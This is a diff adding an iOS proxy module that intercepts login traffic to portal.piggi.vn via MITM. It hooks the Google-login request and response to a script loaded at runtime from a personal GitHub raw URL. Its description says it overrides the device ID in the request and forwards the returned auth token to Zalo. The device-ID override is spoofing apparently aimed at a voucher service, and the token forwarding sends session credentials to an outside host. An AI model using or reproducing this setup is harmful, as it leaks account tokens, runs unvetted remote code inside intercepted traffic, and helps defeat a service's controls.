@@ -1,0 +1,10 @@
+#!name=Piggi Login Override & Zalo Forward
+#!desc=Override deviceId in request body and forward response token to Zalo
+#!system=ios
+
+[Script]
+piggi_login_req = type=http-request, pattern=^https:\/\/portal\.piggi\.vn\/api\/auth\/login\/google, requires-body=1, script-path=https://raw.githubusercontent.com/nguyentrong1121/hl-voucher-app/refs/heads/main/piggi-login.js
+piggi_login_res = type=http-response, pattern=^https:\/\/portal\.piggi\.vn\/api\/auth\/login\/google, requires-body=1, script-path=https://raw.githubusercontent.com/nguyentrong1121/hl-voucher-app/refs/heads/main/piggi-login.js
+
+[MITM]
+hostname = %APPEND% portal.piggi.vn
